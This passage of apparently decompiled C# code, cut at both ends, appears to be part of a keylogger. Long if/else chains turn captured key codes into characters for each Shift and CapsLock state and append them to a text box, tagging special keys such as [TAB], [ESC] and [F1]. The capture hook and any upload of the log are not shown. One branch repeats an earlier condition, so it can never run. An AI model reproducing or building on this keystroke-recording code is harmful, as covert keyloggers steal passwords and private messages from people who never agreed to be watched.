				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
